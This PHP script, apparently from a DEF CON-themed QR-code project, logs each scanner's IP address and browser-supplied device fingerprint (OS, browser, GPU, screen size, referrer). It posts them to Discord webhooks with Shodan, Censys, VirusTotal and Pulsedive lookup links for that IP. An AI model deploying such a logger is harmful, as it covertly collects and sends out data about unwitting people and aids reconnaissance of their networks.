<?php
function getReverseHeaderIp() {
    $reverseHeaderIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    return $reverseHeaderIp;
}

function sendToDiscord($webhookUrls, $embed) {
    $json_data = json_encode([
        "username" => "QR Bot - jbohack",
        "avatar_url" => "https://cdn.lullaby.cafe/defcon/defcon.png",
        "embeds" => [$embed]
    ]);

    foreach ($webhookUrls as $webhookUrl) {
        $ch = curl_init($webhookUrl);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $response = curl_exec($ch);
        curl_close($ch);
    }
}

$webhookUrls = [
    "ENTER YOUR DISCORD WEBHOOK URL HERE",
    "ENTER YOUR DISCORD WEBHOOK URL HERE"
];

$reverseHeaderIp = getReverseHeaderIp();

$timestamp = gmdate("Y-m-d\TH:i:s\Z");

$deviceInfo = json_decode(file_get_contents('php://input'), true);

$deviceType = $deviceInfo['deviceType'] ?? 'N/A';
$operatingSystem = $deviceInfo['operatingSystem'] ?? 'N/A';
$browserVersion = $deviceInfo['browserVersion'] ?? 'N/A';
$gpu = $deviceInfo['gpu'] ?? 'N/A';
$screenResolution = $deviceInfo['screenResolution'] ?? 'N/A';
$platform = $deviceInfo['platform'] ?? 'N/A';
$referrer = $deviceInfo['referrer'] ?? 'Unknown';

// Convert IP to B64 for PulseDive
$reverseHeaderIpBase64 = base64_encode($reverseHeaderIp);

$embed = [
    "title" => "📊 QR-Scan Device Information",
    "color" => hexdec("ffb7c5"), // Sakura pink color
    "fields" => [
        [
            "name" => "🌐 IP Address",
            "value" => $reverseHeaderIp,
            "inline" => true
        ],
        [
            "name" => "📱 Device Type",
            "value" => $deviceType,
            "inline" => true
        ],
        [
            "name" => "💻 Operating System",
            "value" => $operatingSystem,
            "inline" => true
        ],
        [
            "name" => "🌐 Browser & Version",
            "value" => $browserVersion,
            "inline" => true
        ],
        [
            "name" => "🎮 GPU",
            "value" => $gpu,
            "inline" => true
        ],
        [
            "name" => "📏 Screen Resolution",
            "value" => $screenResolution,
            "inline" => true
        ],
        [
            "name" => "🖥️ Platform",
            "value" => $platform,
            "inline" => true
        ],
        [
            "name" => "🔗 Referring URL",
            "value" => $referrer,
            "inline" => false
        ],
        [
            "name" => "🕒 Timestamp",
            "value" => $timestamp,
            "inline" => false
        ],
        [
            "name" => "🔍 OSINT Lookup",
            "value" => "[Censys Lookup](https://search.censys.io/hosts/" . $reverseHeaderIp . ")\n" .
                       "[Shodan Lookup](https://www.shodan.io/host/" . $reverseHeaderIp . ")\n" .
                       "[VirusTotal Lookup](https://www.virustotal.com/gui/ip-address/" . $reverseHeaderIp . ")\n" .
                       "[Pulsedive Lookup](https://pulsedive.com/indicator/?ioc=" . $reverseHeaderIpBase64 . ")",
            "inline" => false
        ]
    ],
    "footer" => [
        "text" => "Made with 🩷 by emilia0001, inspired by RocketGod",
        "icon_url" => "https://cdn.lullaby.cafe/defcon/nyan.png"
    ],
    "thumbnail" => [
        "url" => "https://cdn.lullaby.cafe/defcon/qr_code.png"
    ]
];

sendToDiscord($webhookUrls, $embed);
?>